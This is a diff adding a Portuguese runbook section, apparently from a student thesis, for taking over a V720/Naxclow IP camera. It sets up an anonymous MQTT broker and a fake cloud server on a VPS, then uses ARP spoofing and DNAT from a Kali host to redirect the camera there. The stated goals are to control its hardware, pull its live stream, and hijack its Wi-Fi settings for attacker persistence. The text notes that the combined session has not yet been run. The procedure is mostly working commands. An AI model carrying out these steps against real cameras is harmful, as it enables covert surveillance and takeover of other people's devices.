@@ -159,6 +159,63 @@ sudo ./scripts/mitm_dns/mitm_dns.sh down     # restaura ARP, ip_forward, etter.d
 
 Confirmar no app V720 que a câmera volta a aparecer **online** (cloud real).
 
+## Modo combinado — controle + stream numa sessão só (broker + HTTP + relay na VPS)
+
+O `up` coloca broker/HTTP/relay no **próprio Kali** (IP local). Isso dá **controle** (MQTT),
+mas **não dá o stream** — a câmera só abre o canal de dados pra endpoint **público** (ver
+[achados_fakeserver_relay](achados_fakeserver_relay.md)).
+
+Pra ter **controle E stream juntos** (e liberar o `setwifi` como passo de sequestro), sobe o
+conjunto na **VPS** (IP público) e redireciona a câmera pra ela.
+
+### VPS (IP público)
+
+1. Liberar no firewall/security-group: `80/tcp`, `1883/tcp`, `29940/tcp`, `29940/udp`.
+2. **Liberar a `:80`** — o fake HTTP responde nela. Se tiver nginx: `sudo systemctl stop nginx`.
+3. Broker MQTT anônimo:
+
+   ```
+   printf 'listener 1883 0.0.0.0\nallow_anonymous true\n' > /tmp/mosq.conf
+   mosquitto -c /tmp/mosq.conf -d
+   ```
+
+4. Fake server (aponta pra si mesmo + broker local) — o `setwifi` sai pelo broker:
+
+   ```
+   cd /home/sentinela-tcc
+   export FAKE_SRV_HOST=<vps> FAKE_SRV_RELAY_HOST=<vps> BROKER=127.0.0.1
+   .venv/bin/python src/a9_naxclow.py -s
+   ```
+
+### Kali (mesma LAN)
+
+5. ARP spoof + DNAT de `80` + `1883` + relay pra **VPS** (modo combinado):
+
+   ```
+   sudo CAM_IP=<câmera> DNAT_MODE=all DNAT_TARGET=<vps> ./scripts/mitm_dns/mitm_dns.sh relay
+   ```
+
+6. Conferir `ip_forward=1` e fazer **power-cycle** na câmera (pra ela refazer HTTP/MQTT).
+
+### Validação
+
+- VPS: a câmera registra no broker (`New client ... as <uid>`) e em `/dev/list`; o stream sai
+  em `/dev/<uid>/live`.
+- Controle de hardware (mesmo broker do atacante):
+
+  ```
+  BROKER=<vps> DEV=<uid> ./scripts/fakeserver/fake_srv_cmd.sh ledei off
+  ```
+
+- **Sequestro de rede** (`setwifi`): a câmera reconecta na rede do atacante → **persistência**.
+  Ressalva: a câmera precisa **alcançar** o SSID setado; senão cai no fallback de **AP aberto**.
+
+> **Status:** as duas metades estão **provadas separadamente** — controle por MQTT/DNS
+> ([achados_fakeserver](achados_fakeserver.md) + este runbook, Fase 4) e stream no relay
+> público ([achados_fakeserver_relay](achados_fakeserver_relay.md)). A **junção** (broker +
+> relay na VPS, DNS/DNAT → VPS) **ainda não foi executada numa sessão única** — é o próximo
+> passo natural (ver [`proximos_passos.md`](proximos_passos.md)).
+
 ## Diagnóstico (árvore de decisão)
 
 | Sintoma | Causa provável | Ação |
